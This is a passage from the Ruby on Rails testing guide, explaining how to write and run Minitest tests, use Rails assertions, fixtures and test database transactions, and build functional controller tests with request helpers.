[Capybara](https://github.com/teamcapybara/capybara) and perform in-browser
tests for your application.

The `application_system_test_case.rb` file holds the default configuration for your
system tests.

A `jobs` directory will also be created for your job tests when you first
[generate a job](active_job_basics.html#defining-a-job).

### The Test Environment

By default, every Rails application has three environments: development, test,
and production.

Each environment's configuration can be modified similarly. In this case, we can
modify our test environment by changing the options found in
`config/environments/test.rb`.

NOTE: Your tests are run under `RAILS_ENV=test`. This is set by Rails automatically.

### Writing Your First Test

We introduced the `bin/rails generate model` command in the [Getting Started
with Rails](getting_started.html#creating-a-database-model) guide.
Alongside creating a model, this command also creates a test stub in the `test`
directory:

```bash
$ bin/rails generate model article title:string body:text
...
create  app/models/article.rb
create  test/models/article_test.rb
...
```

The default test stub in `test/models/article_test.rb` looks like this:

```ruby
require "test_helper"

class ArticleTest < ActiveSupport::TestCase
  # test "the truth" do
  #   assert true
  # end
end
```

A line by line examination of this file will help get you oriented to Rails
testing code and terminology.

```ruby
require "test_helper"
```

Requiring the file, `test_helper.rb`, loads the default configuration to run
tests. All methods added to this file are also available in tests when this file
is included.

```ruby
class ArticleTest < ActiveSupport::TestCase
  # ...
end
```

This is called a test case, because the `ArticleTest` class inherits from
`ActiveSupport::TestCase`. It therefore also has all the methods from
`ActiveSupport::TestCase` available to it. [Later in this
guide](#assertions-in-test-cases), we'll see some of the methods this gives us.

Any method defined within a class inherited from `Minitest::Test` (which is the
superclass of `ActiveSupport::TestCase`) that begins with `test_` is simply
called a test. So, methods defined as `test_password` and `test_valid_password`
are test names and are run automatically when the test case is run.

Rails also adds a `test` method that takes a test name and a block. It generates
a standard `Minitest::Unit` test with method names prefixed with `test_`,
allowing you to focus on writing the test logic without having to think about
naming the methods. For example, you can write:

```ruby
test "the truth" do
  assert true
end
```

Which is approximately the same as writing this:

```ruby
def test_the_truth
  assert true
end
```

Although you can still use regular method definitions, using the `test` macro
allows for a more readable test name.

NOTE: The method name is generated by replacing spaces with underscores. The
result does not need to be a valid Ruby identifier, as Ruby allows any string to
serve as a method name, including those containing punctuation characters. While
this may require using `define_method` and `send` to define and invoke such
methods, there are few formal restrictions on the names themselves.

This part of a test is called an 'assertion':

```ruby
assert true
```

An assertion is a line of code that evaluates an object (or expression) for
expected results. For example, an assertion can check:

* does this value equal that value?
* is this object nil?
* does this line of code throw an exception?
* is the user's password greater than 5 characters?

Every test may contain one or more assertions, with no restriction as to how
many assertions are allowed. Only when all the assertions are successful will
the test pass.

#### Your First Failing Test

To see how a test failure is reported, you can add a failing test to the
`article_test.rb` test case. In this example, it is asserted that the article
will not save without meeting certain criteria; hence, if the article saves
successfully, the test will fail, demonstrating a test failure.

```ruby#4-7
require "test_helper"

class ArticleTest < ActiveSupport::TestCase
  test "should not save article without title" do
    article = Article.new
    assert_not article.save
  end
end
```

Here is the output if this newly added test is run:

```bash
$ bin/rails test test/models/article_test.rb
Running 1 tests in a single process (parallelization threshold is 50)
Run options: --seed 44656

# Running:

F

Failure:
ArticleTest#test_should_not_save_article_without_title [/path/to/blog/test/models/article_test.rb:4]:
Expected true to be nil or false


bin/rails test test/models/article_test.rb:4



Finished in 0.023918s, 41.8090 runs/s, 41.8090 assertions/s.

1 runs, 1 assertions, 1 failures, 0 errors, 0 skips
```

In the output, `F` indicates a test failure. The section under `Failure`
includes the name of the failing test, followed by a stack trace and a message
showing the actual value and the expected value from the assertion. The default
assertion messages offer just enough information to help identify the error. For
improved readability, every assertion allows an optional message parameter to
customize the failure message, as shown below:

```ruby
test "should not save article without title" do
  article = Article.new
  assert_not article.save, "Saved the article without a title"
end
```

Running this test shows the friendlier assertion message:

```
Failure:
ArticleTest#test_should_not_save_article_without_title [/path/to/blog/test/models/article_test.rb:6]:
Saved the article without a title
```

To get this test to pass a model-level validation can be added for the `title`
field.

```ruby
class Article < ApplicationRecord
  validates :title, presence: true
end
```

Now the test should pass, as the article in our test has not been initialized
with a `title`, so the model validation will prevent the save. This can be
verified by running the test again:

```bash
$ bin/rails test test/models/article_test.rb:6
Running 1 tests in a single process (parallelization threshold is 50)
Run options: --seed 31252

# Running:

.

Finished in 0.027476s, 36.3952 runs/s, 36.3952 assertions/s.

1 runs, 1 assertions, 0 failures, 0 errors, 0 skips
```

The small green dot displayed means that the test has passed successfully.

TIP: In the process above, a test was written first which fails for a desired
functionality, then after, some code was written which adds the functionality.
Finally, the test was run again to ensure it passes. This approach to software
development is referred to as _Test-Driven Development_ (TDD).

#### Reporting Errors

To see how an error gets reported, here's a test containing an error:

```ruby
test "should report error" do
  # some_undefined_variable is not defined elsewhere in the test case
  some_undefined_variable
  assert true
end
```

Now you can see even more output in the console from running the tests:

```bash
$ bin/rails test test/models/article_test.rb
Running 2 tests in a single process (parallelization threshold is 50)
Run options: --seed 1808

# Running:

E

Error:
ArticleTest#test_should_report_error:
NameError: undefined local variable or method 'some_undefined_variable' for #<ArticleTest:0x007fee3aa71798>
    test/models/article_test.rb:11:in 'block in <class:ArticleTest>'


bin/rails test test/models/article_test.rb:9

.

Finished in 0.040609s, 49.2500 runs/s, 24.6250 assertions/s.

2 runs, 1 assertions, 0 failures, 1 errors, 0 skips
```

Notice the 'E' in the output. It denotes a test with an error. The green dot
above the 'Finished' line denotes the one passing test.

NOTE: The execution of each test method stops as soon as any error or an
assertion failure is encountered, and the test suite continues with the next
method. All test methods are executed in random order. The
[`config.active_support.test_order`][] option can be used to configure test
order.

When a test fails you are presented with the corresponding backtrace. By
default, Rails filters the backtrace and will only print lines relevant to your
application. This eliminates noise and helps you to focus on your code. However,
in situations when you want to see the full backtrace, set the `-b` (or
`--backtrace`) argument to enable this behavior:

```bash
$ bin/rails test -b test/models/article_test.rb
```

If you want this test to pass you can modify it to use `assert_raises` (so you
are now checking for the presence of the error) like so:

```ruby
test "should report error" do
  # some_undefined_variable is not defined elsewhere in the test case
  assert_raises(NameError) do
    some_undefined_variable
  end
end
```

This test should now pass.

[`config.active_support.test_order`]:
    configuring.html#config-active-support-test-order

### Minitest Assertions

By now you've caught a glimpse of some of the assertions that are available.
Assertions are the foundation blocks of testing. They are the ones that actually
perform the checks to ensure that things are going as planned.

Here's an extract of the assertions you can use with
[`minitest`](https://github.com/minitest/minitest), the default testing library
used by Rails. The `[msg]` parameter is an optional string message you can
specify to make your test failure messages clearer.

| Assertion                                                      | Purpose |
| -------------------------------------------------------------- | ------- |
| `assert(test, [msg])`                                          | Ensures that `test` is true.|
| `assert_not(test, [msg])`                                      | Ensures that `test` is false.|
| `assert_equal(expected, actual, [msg])`                        | Ensures that `expected == actual` is true.|
| `assert_not_equal(expected, actual, [msg])`                    | Ensures that `expected != actual` is true.|
| `assert_same(expected, actual, [msg])`                         | Ensures that `expected.equal?(actual)` is true.|
| `assert_not_same(expected, actual, [msg])`                     | Ensures that `expected.equal?(actual)` is false.|
| `assert_nil(obj, [msg])`                                       | Ensures that `obj.nil?` is true.|
| `assert_not_nil(obj, [msg])`                                   | Ensures that `obj.nil?` is false.|
| `assert_empty(obj, [msg])`                                     | Ensures that `obj` is `empty?`.|
| `assert_not_empty(obj, [msg])`                                 | Ensures that `obj` is not `empty?`.|
| `assert_match(regexp, string, [msg])`                          | Ensures that a string matches the regular expression.|
| `assert_no_match(regexp, string, [msg])`                       | Ensures that a string doesn't match the regular expression.|
| `assert_includes(collection, obj, [msg])`                      | Ensures that `obj` is in `collection`.|
| `assert_not_includes(collection, obj, [msg])`                  | Ensures that `obj` is not in `collection`.|
| `assert_in_delta(expected, actual, [delta], [msg])`            | Ensures that the numbers `expected` and `actual` are within `delta` of each other.|
| `assert_not_in_delta(expected, actual, [delta], [msg])`        | Ensures that the numbers `expected` and `actual` are not within `delta` of each other.|
| `assert_in_epsilon(expected, actual, [epsilon], [msg])`        | Ensures that the numbers `expected` and `actual` have a relative error less than `epsilon`.|
| `assert_not_in_epsilon(expected, actual, [epsilon], [msg])`    | Ensures that the numbers `expected` and `actual` have a relative error not less than `epsilon`.|
| `assert_throws(symbol, [msg]) { block }`                       | Ensures that the given block throws the symbol.|
| `assert_raises(exception1, exception2, ...) { block }`         | Ensures that the given block raises one of the given exceptions.|
| `assert_instance_of(class, obj, [msg])`                        | Ensures that `obj` is an instance of `class`.|
| `assert_not_instance_of(class, obj, [msg])`                    | Ensures that `obj` is not an instance of `class`.|
| `assert_kind_of(class, obj, [msg])`                            | Ensures that `obj` is an instance of `class` or is descending from it.|
| `assert_not_kind_of(class, obj, [msg])`                        | Ensures that `obj` is not an instance of `class` and is not descending from it.|
| `assert_respond_to(obj, symbol, [msg])`                        | Ensures that `obj` responds to `symbol`.|
| `assert_not_respond_to(obj, symbol, [msg])`                    | Ensures that `obj` does not respond to `symbol`.|
| `assert_operator(obj1, operator, [obj2], [msg])`               | Ensures that `obj1.operator(obj2)` is true.|
| `assert_not_operator(obj1, operator, [obj2], [msg])`           | Ensures that `obj1.operator(obj2)` is false.|
| `assert_predicate(obj, predicate, [msg])`                      | Ensures that `obj.predicate` is true, e.g. `assert_predicate str, :empty?`|
| `assert_not_predicate(obj, predicate, [msg])`                  | Ensures that `obj.predicate` is false, e.g. `assert_not_predicate str, :empty?`|
| `flunk([msg])`                                                 | Ensures failure. This is useful to explicitly mark a test that isn't finished yet.|

The above are a subset of assertions that minitest supports. For an exhaustive
and more up-to-date list, please check the [minitest API
documentation](http://docs.seattlerb.org/minitest/Minitest), specifically
[`Minitest::Assertions`](http://docs.seattlerb.org/minitest/Minitest/Assertions.html).

With minitest you can add your own assertions. In fact, that's exactly what
Rails does. It includes some specialized assertions to make your life easier.

NOTE: Creating your own assertions is a topic that we won't cover in depth in
this guide.

### Rails-Specific Assertions

Rails adds some custom assertions of its own to the `minitest` framework:

| Assertion                                                                         | Purpose |
| --------------------------------------------------------------------------------- | ------- |
| [`assert_difference(expressions, difference = 1, message = nil) {...}`][] | Test numeric difference between the return value of an expression as a result of what is evaluated in the yielded block.|
| [`assert_no_difference(expressions, message = nil, &block)`][] | Asserts that the numeric result of evaluating an expression is not changed before and after invoking the passed in block.|
| [`assert_changes(expressions, message = nil, from:, to:, &block)`][] | Test that the result of evaluating an expression is changed after invoking the passed in block.|
| [`assert_no_changes(expressions, message = nil, &block)`][] | Test the result of evaluating an expression is not changed after invoking the passed in block.|
| [`assert_nothing_raised { block }`][] | Ensures that the given block doesn't raise any exceptions.|
| [`assert_recognizes(expected_options, path, extras = {}, message = nil)`][] | Asserts that the routing of the given path was handled correctly and that the parsed options (given in the expected_options hash) match path. Basically, it asserts that Rails recognizes the route given by expected_options.|
| [`assert_generates(expected_path, options, defaults = {}, extras = {}, message = nil)`][] | Asserts that the provided options can be used to generate the provided path. This is the inverse of assert_recognizes. The extra parameter is used to tell the request the names and values of additional request parameters that would be in a query string. The message parameter allows you to specify a custom error message for assertion failures.|
| [`assert_routing(expected_path, options, defaults = {}, extras = {}, message = nil)`][] | Asserts that `path` and `options` match both ways; in other words, it verifies that `path` generates `options` and then that `options` generates `path`. This essentially combines `assert_recognizes` and `assert_generates` into one step. The extras hash allows you to specify options that would normally be provided as a query string to the action. The message parameter allows you to specify a custom error message to display upon failure.|
| [`assert_response(type, message = nil)`][] | Asserts that the response comes with a specific status code. You can specify `:success` to indicate 200-299, `:redirect` to indicate 300-399, `:missing` to indicate 404, or `:error` to match the 500-599 range. You can also pass an explicit status number or its symbolic equivalent. For more information, see [full list of status codes](https://rubydoc.info/gems/rack/Rack/Utils#HTTP_STATUS_CODES-constant) and how their [mapping](https://rubydoc.info/gems/rack/Rack/Utils#SYMBOL_TO_STATUS_CODE-constant) works.|
| [`assert_redirected_to(options = {}, message = nil)`][] | Asserts that the response is a redirect to a URL matching the given options. You can also pass named routes such as `assert_redirected_to root_path` and Active Record objects such as `assert_redirected_to @article`.|
| [`assert_queries_count(count = nil, include_schema: false, &block)`][] | Asserts that `&block` generates an `int` number of SQL queries.|
| [`assert_no_queries(include_schema: false, &block)`][] | Asserts that `&block` generates no SQL queries.|
| [`assert_queries_match(pattern, count: nil, include_schema: false, &block)`][] | Asserts that `&block` generates SQL queries that match the pattern.|
| [`assert_no_queries_match(pattern, &block)`][] | Asserts that `&block` generates no SQL queries that match the pattern.|
| [`assert_error_reported(class) { block }`][] | Asserts that the error class has been reported, e.g. `assert_error_reported IOError { Rails.error.report(IOError.new("Oops")) }`|
| [`assert_no_error_reported { block }`][] | Asserts that no errors have been reported, e.g. `assert_no_error_reported { perform_service }`|

[`assert_difference(expressions, difference = 1, message = nil) {...}`]: https://api.rubyonrails.org/classes/ActiveSupport/Testing/Assertions.html#method-i-assert_difference
[`assert_no_difference(expressions, message = nil, &block)`]: https://api.rubyonrails.org/classes/ActiveSupport/Testing/Assertions.html#method-i-assert_no_difference
[`assert_changes(expressions, message = nil, from:, to:, &block)`]: https://api.rubyonrails.org/classes/ActiveSupport/Testing/Assertions.html#method-i-assert_changes
[`assert_no_changes(expressions, message = nil, &block)`]: https://api.rubyonrails.org/classes/ActiveSupport/Testing/Assertions.html#method-i-assert_no_changes
[`assert_nothing_raised { block }`]: https://api.rubyonrails.org/classes/ActiveSupport/Testing/Assertions.html#method-i-assert_nothing_raised
[`assert_recognizes(expected_options, path, extras = {}, message = nil)`]: https://api.rubyonrails.org/classes/ActionDispatch/Assertions/RoutingAssertions.html#method-i-assert_recognizes
[`assert_generates(expected_path, options, defaults = {}, extras = {}, message = nil)`]: https://api.rubyonrails.org/classes/ActionDispatch/Assertions/RoutingAssertions.html#method-i-assert_generates
[`assert_routing(expected_path, options, defaults = {}, extras = {}, message = nil)`]: https://api.rubyonrails.org/classes/ActionDispatch/Assertions/RoutingAssertions.html#method-i-assert_routing
[`assert_response(type, message = nil)`]: https://api.rubyonrails.org/classes/ActionDispatch/Assertions/ResponseAssertions.html#method-i-assert_response
[`assert_redirected_to(options = {}, message = nil)`]: https://api.rubyonrails.org/classes/ActionDispatch/Assertions/ResponseAssertions.html#method-i-assert_redirected_to
[`assert_queries_count(count = nil, include_schema: false, &block)`]: https://api.rubyonrails.org/classes/ActiveRecord/Assertions/QueryAssertions.html#method-i-assert_queries_count
[`assert_no_queries(include_schema: false, &block)`]: https://api.rubyonrails.org/classes/ActiveRecord/Assertions/QueryAssertions.html#method-i-assert_no_queries
[`assert_queries_match(pattern, count: nil, include_schema: false, &block)`]: https://api.rubyonrails.org/classes/ActiveRecord/Assertions/QueryAssertions.html#method-i-assert_queries_match
[`assert_no_queries_match(pattern, &block)`]: https://api.rubyonrails.org/classes/ActiveRecord/Assertions/QueryAssertions.html#method-i-assert_no_queries_match
[`assert_error_reported(class) { block }`]: https://api.rubyonrails.org/classes/ActiveSupport/Testing/ErrorReporterAssertions.html#method-i-assert_error_reported
[`assert_no_error_reported { block }`]: https://api.rubyonrails.org/classes/ActiveSupport/Testing/ErrorReporterAssertions.html#method-i-assert_no_error_reported

You'll see the usage of some of these assertions in the next chapter.

### Assertions in Test Cases

All the basic assertions such as `assert_equal` defined in
`Minitest::Assertions` are also available in the classes we use in our own test
cases. In fact, Rails provides the following classes for you to inherit from:

* [`ActiveSupport::TestCase`](https://api.rubyonrails.org/classes/ActiveSupport/TestCase.html)
* [`ActionMailer::TestCase`](https://api.rubyonrails.org/classes/ActionMailer/TestCase.html)
* [`ActionView::TestCase`](https://api.rubyonrails.org/classes/ActionView/TestCase.html)
* [`ActiveJob::TestCase`](https://api.rubyonrails.org/classes/ActiveJob/TestCase.html)
* [`ActionDispatch::Integration::Session`](https://api.rubyonrails.org/classes/ActionDispatch/Integration/Session.html)
* [`ActionDispatch::SystemTestCase`](https://api.rubyonrails.org/classes/ActionDispatch/SystemTestCase.html)
* [`Rails::Generators::TestCase`](https://api.rubyonrails.org/classes/Rails/Generators/TestCase.html)

Each of these classes include `Minitest::Assertions`, allowing us to use all of
the basic assertions in your tests.

TIP: For more information on `minitest`, refer to the [minitest
documentation](http://docs.seattlerb.org/minitest).

### The Rails Test Runner

We can run all of our tests at once by using the `bin/rails test` command.

Or we can run a single test file by appending the filename to the `bin/rails
test` command.

```bash
$ bin/rails test test/models/article_test.rb
Running 1 tests in a single process (parallelization threshold is 50)
Run options: --seed 1559

# Running:

..

Finished in 0.027034s, 73.9810 runs/s, 110.9715 assertions/s.

2 runs, 3 assertions, 0 failures, 0 errors, 0 skips
```

This will run all test methods from the test case.

You can also run a particular test method from the test case by providing the
`-n` or `--name` flag and the test's method name.

```bash
$ bin/rails test test/models/article_test.rb -n test_the_truth
Running 1 tests in a single process (parallelization threshold is 50)
Run options: -n test_the_truth --seed 43583

# Running:

.

Finished tests in 0.009064s, 110.3266 tests/s, 110.3266 assertions/s.

1 tests, 1 assertions, 0 failures, 0 errors, 0 skips
```

You can also run a test at a specific line by providing the line number.

```bash
$ bin/rails test test/models/article_test.rb:6 # run specific test and line
```

You can also run a range of tests by providing the line range:

```bash
$ bin/rails test test/models/article_test.rb:6-20 # runs tests from line 6 to 20
```

You can also run an entire directory of tests by providing the path to the
directory.

```bash
$ bin/rails test test/controllers # run all tests from specific directory
```

The test runner also provides a lot of other features like failing fast, showing
verbose progress, and so on. Check the documentation of the test runner using
the command below:

```bash
$ bin/rails test -h
Usage:
  bin/rails test [PATHS...]

Run tests except system tests

Examples:
    You can run a single test by appending a line number to a filename:

        bin/rails test test/models/user_test.rb:27

    You can run multiple tests within a line range by appending the line range to a filename:

        bin/rails test test/models/user_test.rb:10-20

    You can run multiple files and directories at the same time:

        bin/rails test test/controllers test/integration/login_test.rb

    By default test failures and errors are reported inline during a run.

minitest options:
    -h, --help                       Display this help.
        --no-plugins                 Bypass minitest plugin auto-loading (or set $MT_NO_PLUGINS).
    -s, --seed SEED                  Sets random seed. Also via env. Eg: SEED=n rake
    -v, --verbose                    Verbose. Show progress processing files.
        --show-skips                 Show skipped at the end of run.
    -n, --name PATTERN               Filter run on /regexp/ or string.
        --exclude PATTERN            Exclude /regexp/ or string from run.
    -S, --skip CODES                 Skip reporting of certain types of results (eg E).

Known extensions: rails, pride
    -w, --warnings                   Run with Ruby warnings enabled
    -e, --environment ENV            Run tests in the ENV environment
    -b, --backtrace                  Show the complete backtrace
    -d, --defer-output               Output test failures and errors after the test run
    -f, --fail-fast                  Abort test run on first failure or error
    -c, --[no-]color                 Enable color in the output
        --profile [COUNT]            Enable profiling of tests and list the slowest test cases (default: 10)
    -p, --pride                      Pride. Show your testing pride!
```

The Test Database
-----------------

Just about every Rails application interacts heavily with a database and so your
tests will need a database to interact with as well. This section covers how to
set up this test database and populate it with sample data.

As mentioned in the [Test Environment section](#the-test-environment), every
Rails application has three environments: development, test, and production. The
database for each one of them is configured in `config/database.yml`.

A dedicated test database allows you to set up and interact with test data in
isolation. This way your tests can interact with test data with confidence,
without worrying about the data in the development or production databases.

### Maintaining the Test Database Schema

In order to run your tests, your test database needs the current schema. The
test helper checks whether your test database has any pending migrations. It
will try to load your `db/schema.rb` or `db/structure.sql` into the test
database. If migrations are still pending, an error will be raised. Usually this
indicates that your schema is not fully migrated. Running the migrations (using
`bin/rails db:migrate RAILS_ENV=test`) will bring the schema up to date.

NOTE: If there were modifications to existing migrations, the test database
needs to be rebuilt. This can be done by executing `bin/rails test:db`.

### Fixtures

For good tests, you'll need to give some thought to setting up test data. In
Rails, you can handle this by defining and customizing fixtures. You can find
comprehensive documentation in the [Fixtures API
documentation](https://api.rubyonrails.org/classes/ActiveRecord/FixtureSet.html).

#### What are Fixtures?

_Fixtures_ is a fancy word for a consistent set of test data. Fixtures allow you to populate your
testing database with predefined data before your tests run. Fixtures are
database independent and written in YAML. There is one file per model.

NOTE: Fixtures are not designed to create every object that your tests need, and
are best managed when only used for default data that can be applied to the
common case.

Fixtures are stored in your `test/fixtures` directory.

#### YAML

[YAML](https://en.wikipedia.org/wiki/YAML) is a human-readable data serialization language.
YAML-formatted fixtures are a human-friendly way to describe your sample data.
These types of fixtures have the **.yml** file extension (as in `users.yml`).

Here's a sample YAML fixture file:

```yaml
# lo & behold! I am a YAML comment!
david:
  name: David Heinemeier Hansson
  birthday: 1979-10-15
  profession: Systems development

steve:
  name: Steve Ross Kellock
  birthday: 1974-09-27
  profession: guy with keyboard
```

Each fixture is given a name followed by an indented list of colon-separated
key/value pairs. Records are typically separated by a blank line. You can place
comments in a fixture file by using the # character in the first column.

If you are working with [associations](association_basics.html), you can define
a reference node between two different fixtures. Here's an example with a
`belongs_to`/`has_many` association:

```yaml
# test/fixtures/categories.yml
web_frameworks:
  name: Web Frameworks
```

```yaml
# test/fixtures/articles.yml
first:
  title: Welcome to Rails!
  category: web_frameworks
```

```yaml
# test/fixtures/action_text/rich_texts.yml
first_content:
  record: first (Article)
  name: content
  body: <div>Hello, from <strong>a fixture</strong></div>
```

Notice the `category` key of the `first` Article found in
`fixtures/articles.yml` has a value of `web_frameworks`, and that the `record` key of the
`first_content` entry found in `fixtures/action_text/rich_texts.yml` has a value
of `first (Article)`. This hints to Active Record to load the Category `web_frameworks`
found in `fixtures/categories.yml` for the former, and Action Text to load the
Article `first` found in `fixtures/articles.yml` for the latter.

NOTE: For associations to reference one another by name, you can use the fixture
name instead of specifying the `id:` attribute on the associated fixtures. Rails
will auto-assign a primary key to be consistent between runs. For more
information on this association behavior please read the [Fixtures API
documentation](https://api.rubyonrails.org/classes/ActiveRecord/FixtureSet.html).

#### File Attachment Fixtures

Like other Active Record-backed models, Active Storage attachment records
inherit from ActiveRecord::Base instances and can therefore be populated by
fixtures.

Consider an `Article` model that has an associated image as a `thumbnail`
attachment, along with fixture data YAML:

```ruby
class Article < ApplicationRecord
  has_one_attached :thumbnail
end
```

```yaml
# test/fixtures/articles.yml
first:
  title: An Article
```

Assuming that there is an [image/png][] encoded file at
`test/fixtures/files/first.png`, the following YAML fixture entries will
generate the related `ActiveStorage::Blob` and `ActiveStorage::Attachment`
records:

```yaml
# test/fixtures/active_storage/blobs.yml
first_thumbnail_blob: <%= ActiveStorage::FixtureSet.blob filename: "first.png" %>
```

```yaml
# test/fixtures/active_storage/attachments.yml
first_thumbnail_attachment:
  name: thumbnail
  record: first (Article)
  blob: first_thumbnail_blob
```

[image/png]:
    https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#image_types

#### Embedding Code in Fixtures

ERB allows you to embed Ruby code within templates. The YAML fixture format is
pre-processed with ERB when Rails loads fixtures. This allows you to use Ruby to
help you generate some sample data. For example, the following code generates a
thousand users:

```erb
<% 1000.times do |n| %>
  user_<%= n %>:
    username: <%= "user#{n}" %>
    email: <%= "user#{n}@example.com" %>
<% end %>
```

#### Fixtures in Action

Rails automatically loads all fixtures from the `test/fixtures` directory by
default. Loading involves three steps:

1. Remove any existing data from the table corresponding to the fixture
2. Load the fixture data into the table
3. Dump the fixture data into a method in case you want to access it directly

TIP: In order to remove existing data from the database, Rails tries to disable
referential integrity triggers (like foreign keys and check constraints). If you
are getting permission errors on running tests, make sure the database user has
the permission to disable these triggers in the testing environment. (In
PostgreSQL, only superusers can disable all triggers. Read more about
[permissions in the PostgreSQL
docs](https://www.postgresql.org/docs/current/sql-altertable.html)).

#### Fixtures are Active Record Objects

Fixtures are instances of Active Record. As mentioned above, you can access the
object directly because it is automatically available as a method whose scope is
local to the test case. For example:

```ruby
# this will return the User object for the fixture named david
users(:david)

# this will return the property for david called id
users(:david).id

# methods available to the User object can also be accessed
david = users(:david)
david.call(david.partner)
```

To get multiple fixtures at once, you can pass in a list of fixture names. For
example:

```ruby
# this will return an array containing the fixtures david and steve
users(:david, :steve)
```

### Transactions

By default, Rails automatically wraps tests in a database transaction that is
rolled back once completed. This makes tests independent of each other and means
that changes to the database are only visible within a single test.

```ruby
class MyTest < ActiveSupport::TestCase
  test "newly created users are active by default" do
    # Since the test is implicitly wrapped in a database transaction, the user
    # created here won't be seen by other tests.
    assert User.create.active?
  end
end
```

The method
[`ActiveRecord::Base.current_transaction`](https://api.rubyonrails.org/classes/ActiveRecord/Transactions/ClassMethods.html#method-i-current_transaction)
still acts as intended, though:

```ruby
class MyTest < ActiveSupport::TestCase
  test "Active Record current_transaction method works as expected" do
    # The implicit transaction around tests does not interfere with the
    # application-level semantics of the current_transaction.
    assert User.current_transaction.blank?
  end
end
```

If there are [multiple writing databases](active_record_multiple_databases.html)
in place, tests are wrapped in as many respective transactions, and all of them
are rolled back.

#### Opting-out of Test Transactions

Individual test cases can opt-out:

```ruby
class MyTest < ActiveSupport::TestCase
  # No implicit database transaction wraps the tests in this test case.
  self.use_transactional_tests = false
end
```

Testing Models
--------------

Model tests are used to test the models of your application and their associated
logic. You can test this logic using the assertions and fixtures that we've
explored in the sections above.

Rails model tests are stored under the `test/models` directory. Rails provides a
generator to create a model test skeleton for you.

```bash
$ bin/rails generate test_unit:model article
create  test/models/article_test.rb
```

This command will generate the following file:

```ruby
# article_test.rb
require "test_helper"

class ArticleTest < ActiveSupport::TestCase
  # test "the truth" do
  #   assert true
  # end
end
```

Model tests don't have their own superclass like `ActionMailer::TestCase`.
Instead, they inherit from
[`ActiveSupport::TestCase`](https://api.rubyonrails.org/classes/ActiveSupport/TestCase.html).

Functional Testing for Controllers
----------------------------------

When writing functional tests, you are focusing on testing how controller
actions handle the requests and the expected result or response. Functional
controller tests are used to test controllers and other behavior, like API responses.

### What to Include in Your Functional Tests

You could test for things such as:

* was the web request successful?
* was the user redirected to the right page?
* was the user successfully authenticated?
* was the correct information displayed in the response?

The easiest way to see functional tests in action is to generate a controller
using the scaffold generator:

```bash
$ bin/rails generate scaffold_controller article
...
create  app/controllers/articles_controller.rb
...
invoke  test_unit
create    test/controllers/articles_controller_test.rb
...
```

This will generate the controller code and tests for an `Article` resource. You
can take a look at the file `articles_controller_test.rb` in the
`test/controllers` directory.

If you already have a controller and just want to generate the test scaffold
code for each of the seven default actions, you can use the following command:

```bash
$ bin/rails generate test_unit:scaffold article
...
invoke  test_unit
create    test/controllers/articles_controller_test.rb
...
```

NOTE: if you are generating test scaffold code, you will see an `@article` value
is set and used throughout the test file. This instance of `article` uses the
attributes nested within a `:one` key in the `test/fixtures/articles.yml` file.
Make sure you have set the key and related values in this file before you try to
run the tests.

Let's take a look at one such test, `test_should_get_index` from the file
`articles_controller_test.rb`.

```ruby
# articles_controller_test.rb
class ArticlesControllerTest < ActionDispatch::IntegrationTest
  test "should get index" do
    get articles_url
    assert_response :success
  end
end
```

In the `test_should_get_index` test, Rails simulates a request on the action
called `index`, making sure the request was successful, and also ensuring that
the right response body has been generated.

The `get` method kicks off the web request and populates the results into the
`@response`. It can accept up to 6 arguments:

* The URI of the controller action you are requesting. This can be in the form
  of a string or a route helper (e.g. `articles_url`).
* `params`: option with a hash of request parameters to pass into the action
  (e.g. query string parameters or article variables).
* `headers`: for setting the headers that will be passed with the request.
* `env`: for customizing the request environment as needed.
* `xhr`: whether the request is an AJAX request or not. Can be set to true for
  marking the request as AJAX.
* `as`: for encoding the request with different content type.

All of these keyword arguments are optional.

Example: Calling the `:show` action (via a `get` request) for the first
`Article`, passing in an `HTTP_REFERER` header:

```ruby
get article_url(Article.first), headers: { "HTTP_REFERER" => "http://example.com/home" }
```

Another example: Calling the `:update` action (via a `patch` request) for the
last `Article`, passing in new text for the `title` in `params`, as an AJAX
request:

```ruby
patch article_url(Article.last), params: { article: { title: "updated" } }, xhr: true
```

One more example: Calling the `:create` action (via a `post` request) to create
a new article, passing in text for the `title` in `params`, as JSON request:

```ruby
post articles_url, params: { article: { title: "Ahoy!" } }, as: :json
```

NOTE: If you try running the `test_should_create_article` test from
`articles_controller_test.rb` it will (correctly) fail due to the newly added
model-level validation.

Now to modify the `test_should_create_article` test in
`articles_controller_test.rb` so that this test passes:

```ruby
test "should create article" do
  assert_difference("Article.count") do
    post articles_url, params: { article: { body: "Rails is awesome!", title: "Hello Rails" } }
  end

  assert_redirected_to article_path(Article.last)
end
```

You can now run this test and it will pass.

NOTE: If you followed the steps in the [Basic
Authentication](getting_started.html#adding-authentication) section, you'll need
to add authorization to every request header to get all the tests passing:

```ruby
post articles_url, params: { article: { body: "Rails is awesome!", title: "Hello Rails" } }, headers: { Authorization: ActionController::HttpAuthentication::Basic.encode_credentials("dhh", "secret") }
```

### HTTP Request Types for Functional Tests

If you're familiar with the HTTP protocol, you'll know that `get` is a type of
request. There are 7 request types supported in Rails functional tests:

* `get`
* `post`
* `patch`
* `put`
* `head`
* `delete`
* `query`

The `query` helper issues an HTTP QUERY request
([RFC 10008](https://www.rfc-editor.org/rfc/rfc10008)) and sends `params` as
the request body, matching how QUERY carries its query in the request content:

```ruby
test "can search articles" do
  query articles_search_url, params: { q: "Rails" }

  assert_response :success
end
```

All of the request types have equivalent methods that you can use. In a typical
CRUD application you'll be using `post`, `get`, `put`, and `delete` most
often.

NOTE: Functional tests do not verify whether the specified request type is
accepted by the action; instead, they focus on the result. For testing the
request type, request tests are available, making your tests more purposeful.

### Testing XHR (AJAX) Requests

An AJAX request (Asynchronous JavaScript and XML) is a technique where content is
fetched from the server using asynchronous HTTP requests and the relevant parts
of the page are updated without requiring a full page load.

To test AJAX requests, you can specify the `xhr: true` option to `get`, `post`,
`patch`, `put`, `delete`, and `query` methods. For example:

```ruby
test "AJAX request" do
  article = articles(:one)
  get article_url(article), xhr: true

  assert_equal "hello world", @response.body
  assert_equal "text/javascript", @response.media_type
end
```

### Testing Other Request Objects

After any request has been made and processed, you will have 3 Hash objects
ready for use:

* `cookies` - Any cookies that are set
* `flash` - Any objects living in the flash
* `session` - Any object living in session variables

As is the case with normal Hash objects, you can access the values by
referencing the keys by string. You can also reference them by symbol name. For
example:

```ruby
flash["gordon"]               # or flash[:gordon]
session["shmession"]          # or session[:shmession]
cookies["are_good_for_u"]     # or cookies[:are_good_for_u]
```

### Instance Variables

You also have access to three instance variables in your functional tests after
a request is made:

* `@controller` - The controller processing the request
* `@request` - The request object
